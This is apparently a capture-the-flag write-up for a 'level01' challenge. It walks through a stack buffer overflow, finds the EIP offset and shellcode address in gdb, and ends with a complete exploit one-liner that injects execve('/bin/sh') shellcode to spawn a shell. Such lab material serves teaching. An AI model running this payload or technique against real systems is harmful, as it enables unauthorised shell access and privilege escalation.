this is a classic buffer overflow, we can write data on the stack
the first fgets is secured, and the program want a specific string to continue the execution
but the second fgets is vulnerable, as usual we use a pattern generator to find the offset
so we know we can override EIP after 80 bytes, but which address we will jump to ?

there is no function to get a shell in the program so we will use a shellcode
so we will build our payload like that : [shellcode] [padding] [shellcode address]
but how we know the address of our shellcode that need to be written into EIP ?

we will launch the program in gdb, "disas main" and break to the address after the second fgets
we run the program with a lot of dummy "A" characters, when hitting the breakpoint, we type "x/64x $esp"
so we can read the data on the stack, then we have to found our dummy data and note the address related
in the exploit, we will replace the dummy data by our shellcode, but the address we found remains the same

there is one more problem, because the environment variables differs from gdb debugging and normal execution
so the stack addresses differs too, to use the address we found in gdb we'll have to use the exact same environment variables :

env -i PWD="/home/users/level01" SHELL="/bin/bash" SHLVL=0 gdb /home/users/level01/level01
unset env LINES
unset env COLUMNS

then note the address of our shellcode, in this case its 0xffffddcc, if we launch the program with the same environnement variables the final exploit is :

(python -c 'print "dat_wil\n" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\xcc\xdd\xff\xff"' ; cat) | env -i PWD="/home/users/level01" SHELL="/bin/bash" SHLVL=0 /home/users/level01/level01
